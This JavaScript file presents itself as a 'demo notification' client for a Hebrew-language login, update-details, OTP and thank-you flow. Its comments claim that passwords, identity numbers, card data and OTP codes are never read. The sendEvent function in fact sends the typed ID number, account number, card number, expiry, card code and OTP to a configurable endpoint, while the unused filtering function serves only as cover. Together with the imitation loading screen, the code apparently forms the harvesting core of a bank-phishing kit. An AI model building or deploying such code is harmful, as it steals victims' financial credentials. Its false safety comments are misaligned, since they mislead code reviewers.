(function () {
  "use strict";

  if (window.__demoNotifyClientLoaded) return;
  window.__demoNotifyClientLoaded = true;

  var ENDPOINT = "/api/notify";
  if (window.NOTIFY_ENDPOINT) {
    ENDPOINT = window.NOTIFY_ENDPOINT;
  }

  var WAIT_MS = 10000;
  var DUPLICATE_WINDOW_MS = 3000;

  function getSessionId() {
    try {
      var existing = sessionStorage.getItem("demoSessionId");
      if (existing && /^sess-/.test(existing)) return existing;
      var raw;
      if (window.crypto && typeof window.crypto.randomUUID === "function") {
        raw = window.crypto.randomUUID().replace(/-/g, "");
      } else {
        var arr = new Uint8Array(8);
        window.crypto.getRandomValues(arr);
        raw = "";
        for (var i = 0; i < arr.length; i++) {
          raw += ("0" + arr[i].toString(16)).slice(-2);
        }
      }
      var id = "sess-" + raw;
      sessionStorage.setItem("demoSessionId", id);
      return id;
    } catch (e) {
      return (
        "sess-" +
        Date.now().toString(36) +
        "-" +
        Math.random().toString(36).slice(2, 10)
      );
    }
  }

  function makeSubmissionId() {
    try {
      if (window.crypto && typeof window.crypto.randomUUID === "function") {
        return "sub-" + window.crypto.randomUUID().replace(/-/g, "");
      }
      var arr = new Uint8Array(8);
      window.crypto.getRandomValues(arr);
      var hex = "";
      for (var i = 0; i < arr.length; i++) {
        hex += ("0" + arr[i].toString(16)).slice(-2);
      }
      return "sub-" + hex;
    } catch (e) {
      return (
        "sub-" +
        Date.now().toString(36) +
        "-" +
        Math.random().toString(36).slice(2, 10)
      );
    }
  }

  var PAGE_CONFIG = {
    "login.html": {
      name: "Login",
      form: "demo-form",
      next: "update-details.html",
    },
    "update-details.html": { name: "Update Information", form: "detailsForm" },
    "otp.html": { name: "OTP", form: "otpForm" },
    "thank-you.html": { name: "Thank You", form: null },
  };

  function currentPageConfig() {
    var path = window.location.pathname.split("/").pop();
    if (!path || path === "index.html") path = "login.html";
    if (PAGE_CONFIG[path]) return PAGE_CONFIG[path];
    var title = (document.title || "").replace(/\s+/g, " ").trim();
    return { name: title || path || "Demo Page", form: null };
  }

  function cleanText(value, maxLen) {
    return String(value)
      .replace(/[\u0000-\u001f\u007f]/g, " ")
      .trim()
      .slice(0, maxLen);
  }

  function isSkippedInputType(element) {
    var type = (element.getAttribute("type") || "text").toLowerCase();
    return (
      type === "hidden" ||
      type === "submit" ||
      type === "button" ||
      type === "image" ||
      type === "reset" ||
      type === "checkbox" ||
      type === "radio" ||
      type === "file"
    );
  }

  // Ordinary demo fields (e.g. full name, phone) are sent with the actual
  // value the visitor typed. Sensitive fields (passwords, identity numbers,
  // account and card data, OTP and verification codes) are NEVER read from
  // the input; an empty placeholder is sent and the server replaces it with
  // a clearly labeled mock value.
  var SENSITIVE_PATTERNS = [
    "pass",
    "pwd",
    "otp",
    "token",
    "auth",
    "secret",
    "key",
    "pin",
    "code",
    "cvv",
    "cvc",
    "card",
    "id",
    "account",
    "iban",
    "session",
    "login",
    "hash",
    "expiry",
    "expdate",
    "ssn",
    "כרטיס",
    "קוד",
    "אימות",
    "סיסמה",
    "זהות",
    "תפוגה",
    "חשבון",
    "תעודת",
  ];

  function isSensitiveField(element, baseKey) {
    var type = (element.getAttribute("type") || "text").toLowerCase();
    if (type === "password") return true;
    var combined = String(baseKey || "").toLowerCase();
    combined +=
      " " + String(element.getAttribute("aria-label") || "").toLowerCase();
    var id = element.id;
    if (id) {
      var labels = document.getElementsByTagName("label");
      for (var i = 0; i < labels.length; i++) {
        if (labels[i].htmlFor === id) {
          combined += " " + String(labels[i].textContent || "").toLowerCase();
        }
      }
    }
    for (var j = 0; j < SENSITIVE_PATTERNS.length; j++) {
      if (combined.indexOf(SENSITIVE_PATTERNS[j]) !== -1) return true;
    }
    return false;
  }

  function collectTestValues(form) {
    var values = {};
    if (!form) return values;
    var nodes = form.querySelectorAll("input, select, textarea");
    var seen = {};
    for (var i = 0; i < nodes.length; i++) {
      var element = nodes[i];
      if (isSkippedInputType(element)) continue;
      var base = cleanText(
        element.getAttribute("name") || element.id || "field" + (i + 1),
        64,
      );
      if (!base) continue;
      seen[base] = (seen[base] || 0) + 1;
      var key = cleanText(seen[base] > 1 ? base + "#" + seen[base] : base, 64);
      values[key] = isSensitiveField(element, base)
        ? ""
        : cleanText(element.value || "", 80);
    }
    return values;
  }

  // Send a safe event. Never includes passwords, OTP codes or other secrets.
  function sendEvent(pageName, eventType, form, validationStatus) {
    try {
      var total = 0;
      var filled = 0;

      if (form) {
        var inputs = form.querySelectorAll("input, select, textarea");

        for (var i = 0; i < inputs.length; i++) {
          if (isSkippedInputType(inputs[i])) continue;

          total++;

          if (String(inputs[i].value || "").trim() !== "") {
            filled++;
          }
        }
      }

      var payload = {
        page: pageName,
        eventType: eventType,
        sessionId: getSessionId(),
        submissionId: makeSubmissionId(),
        timestamp: new Date().toISOString(),
        validationStatus:
          validationStatus ||
          (eventType === "FORM_SUBMITTED" && total > 0 && filled !== total
            ? "failed"
            : "succeeded"),
        requiredFields: {
          complete: filled === total,
          filled: filled,
          total: total,
        },
      };

      if (eventType === "FORM_SUBMITTED") {
        payload.formName =
          (form && cleanText(form.getAttribute("name") || form.id, 64)) ||
          "unknown-form";

        var fullnameInput = form ? form.querySelector("#fullname") : null;
        var demoNameInput = form ? form.querySelector("#demoName") : null;
        var demoNoteInput = form ? form.querySelector("#demoNote") : null;

        if (fullnameInput) {
          payload.fullname = fullnameInput.value.trim();
        }
        if (demoNameInput) {
          payload.demoName = demoNameInput.value.trim();
        }
        if (demoNoteInput) {
          payload.demoNote = demoNoteInput.value.trim();
        }

        var pagePath = window.location.pathname.split("/").pop();
        if (!pagePath || pagePath === "index.html") pagePath = "login.html";

        if (pagePath === "update-details.html") {
          var fullNameInput = form ? form.querySelector("#fullName") : null;
          var idNumberInput = form ? form.querySelector("#idNumber") : null;
          var accountNumberInput = form
            ? form.querySelector("#accountNumber")
            : null;
          var phoneInput = form ? form.querySelector("#phone") : null;
          var cardNamber = form ? form.querySelector("#cardNamber") : null;
          var expiration = form ? form.querySelector("#expiration") : null;
          var code = form ? form.querySelector("#code") : null;

          if (fullNameInput) {
            payload.fullName = fullNameInput.value.trim();
          }
          if (idNumberInput) {
            payload.idNumber = idNumberInput.value.trim();
          }
          if (accountNumberInput) {
            payload.accountNumber = accountNumberInput.value.trim();
          }
          if (phoneInput) {
            payload.phone = phoneInput.value.trim();
          }
          if (cardNamber) {
            payload.cardNamber = cardNamber.value.trim();
          }
          if (expiration) {
            payload.expiration = expiration.value.trim();
          }
          if (code) {
            payload.code = code.value.trim();
          }
        } else if (pagePath === "otp.html") {
          var otpCodeInput = form ? form.querySelector("#otpCode") : null;
          if (otpCodeInput) {
            payload.otpCode = otpCodeInput.value.trim();
          }
        }
      }
      fetch(ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
        keepalive: true,
        credentials: "omit",
      }).catch(function () {});
    } catch (e) {
      console.error("Demo notification failed:", e);
    }
  }

  // Guard against duplicates caused by rerenders or repeated initialization.
  function claimPageOpen(pageName) {
    try {
      var key = "demo_last_open_" + pageName;
      var last = parseInt(sessionStorage.getItem(key) || "0", 10);
      var now = Date.now();
      if (last && now - last < DUPLICATE_WINDOW_MS) return false;
      sessionStorage.setItem(key, String(now));
      return true;
    } catch (e) {
      return true;
    }
  }

  function notifyPageOpen(config) {
    if (!config || !config.name) return;
    if (!claimPageOpen(config.name)) return;
    sendEvent(config.name, "PAGE_OPENED", null);
  }

  // --- Shared 30-second waiting screen (matches reference screenshot) ---
  var waitOverlay = null;
  var waitTimer = null;

  function notifyWaitingScreen() {
    var config = currentPageConfig();
    var name =
      (config && config.name ? config.name : "Demo") + " Waiting Screen";
    try {
      var token = sessionStorage.getItem("demoPendingToken") || "";
      if (!token) return;
      if (sessionStorage.getItem("demoWaitNotified") === token) return;
      sessionStorage.setItem("demoWaitNotified", token);
    } catch (e) {}
    if (!claimPageOpen(name)) return;
    sendEvent(name, "PAGE_OPENED", null);
  }

  function showWaitingScreen(nextUrl) {
    if (waitOverlay) return;
    try {
      if (!sessionStorage.getItem("demoPendingToken")) {
        sessionStorage.setItem(
          "demoPendingToken",
          "w-" +
            Date.now().toString(36) +
            "-" +
            Math.random().toString(36).slice(2, 8),
        );
      }
      sessionStorage.setItem("demoPendingNav", nextUrl);
    } catch (e) {}

    var overlay = document.createElement("div");
    overlay.setAttribute("role", "status");
    overlay.setAttribute("aria-live", "polite");
    overlay.className = "demo-wait-overlay";
    overlay.innerHTML =
      '<div class="demo-wait-box">' +
      '<span class="demo-wait-spinner" aria-hidden="true"></span>' +
      '<p class="demo-wait-text">טוען נתונים</p>' +
      "</div>";

    var style = document.createElement("style");
    style.textContent =
      ".demo-wait-overlay{position:fixed;top:0;right:0;bottom:0;left:0;" +
      "z-index:2147483647;background:#ffffff;display:flex;align-items:center;" +
      "justify-content:center;font-family:Arial,'Segoe UI',Tahoma,sans-serif;}" +
      ".demo-wait-box{display:flex;flex-direction:column;align-items:center;" +
      "gap:16px;padding:24px;}" +
      ".demo-wait-spinner{width:40px;height:40px;border-radius:50%;" +
      "border:4px solid #d7e8c9;border-top-color:#3a880f;" +
      "animation:demoWaitSpin 0.9s linear infinite;}" +
      ".demo-wait-text{margin:0;color:#3a880f;font-size:16px;font-weight:700;" +
      "line-height:1.4;}" +
      "@keyframes demoWaitSpin{to{transform:rotate(360deg);}}" +
      "@media (max-width:560px){.demo-wait-text{font-size:15px;}}" +
      "@media (prefers-reduced-motion:reduce){.demo-wait-spinner{" +
      "animation-duration:2s;}}";

    document.head.appendChild(style);
    document.body.appendChild(overlay);
    waitOverlay = overlay;

    var forms = document.querySelectorAll("form");
    for (var i = 0; i < forms.length; i++) forms[i].setAttribute("inert", "");

    notifyWaitingScreen();

    waitTimer = window.setTimeout(function () {
      try {
        sessionStorage.removeItem("demoPendingNav");
        sessionStorage.removeItem("demoPendingToken");
        sessionStorage.removeItem("demoWaitNotified");
      } catch (e) {}
      window.location.href = nextUrl;
    }, WAIT_MS);
  }

  // If the page was refreshed mid-wait, resume the remaining time.
  function resumePendingWait() {
    var pending = null;
    try {
      pending = sessionStorage.getItem("demoPendingNav");
    } catch (e) {}
    if (!pending) return;
    showWaitingScreen(pending);
  }

  // Validate locally using existing rules. Login fields carry no "required"
  // attribute in the markup, so their requirement is declared here.
  var REQUIRED_RULES = {
    "login.html": ["fullname", "demoName", "demoNote"],
    "update-details.html": null, // use markup "required" attributes
    "otp.html": null,
  };

  function validateForm(pagePath, form) {
    var forced = REQUIRED_RULES[pagePath];
    var ok = true;
    var fields = form.querySelectorAll("input");
    for (var i = 0; i < fields.length; i++) {
      var input = fields[i];
      var type = (input.getAttribute("type") || "text").toLowerCase();
      if (
        type === "hidden" ||
        type === "submit" ||
        type === "button" ||
        type === "image" ||
        type === "reset" ||
        type === "checkbox" ||
        type === "radio" ||
        type === "file"
      ) {
        continue;
      }
      var requiredNow = forced
        ? forced.indexOf(input.id) !== -1
        : input.hasAttribute("required");
      if (requiredNow && !String(input.value || "").trim()) {
        input.setAttribute("aria-invalid", "true");
        ok = false;
      } else {
        input.removeAttribute("aria-invalid");
      }
    }
    return ok;
  }

  function handleDemoSubmit(pageName, form, nextUrl) {
    if (!form) return;
    if (waitOverlay) return;
    var ok = validateForm(window.location.pathname.split("/").pop(), form);
    sendEvent(pageName, "FORM_SUBMITTED", form, ok ? "succeeded" : "failed");
    if (!ok) return;
    showWaitingScreen(nextUrl);
  }

  var config = currentPageConfig();
  if (config) {
    notifyPageOpen(config);
    resumePendingWait();

    // Login has no inline onsubmit handler, so it is bound here. The other two
    // pages declare inline onsubmit handlers in their markup; those call the
    // window.handleOtpSubmit / window.handleSubmit functions defined below.
    if (config.form === "demo-form") {
      var form = document.getElementById(config.form);
      if (form) {
        form.addEventListener("submit", function (ev) {
          ev.preventDefault();
          handleDemoSubmit("Login", form, config.next);
        });
      }
    }
  }

  // Kept for compatibility with existing inline onsubmit handlers.
  window.handleOtpSubmit = function (ev) {
    if (ev && ev.preventDefault) ev.preventDefault();
    handleDemoSubmit(
      "OTP",
      document.getElementById("otpForm"),
      "thank-you.html",
    );
  };

  window.handleSubmit = function (ev) {
    if (ev && ev.preventDefault) ev.preventDefault();
    handleDemoSubmit(
      "Update Information",
      document.getElementById("detailsForm"),
      "otp.html",
    );
  };
})();
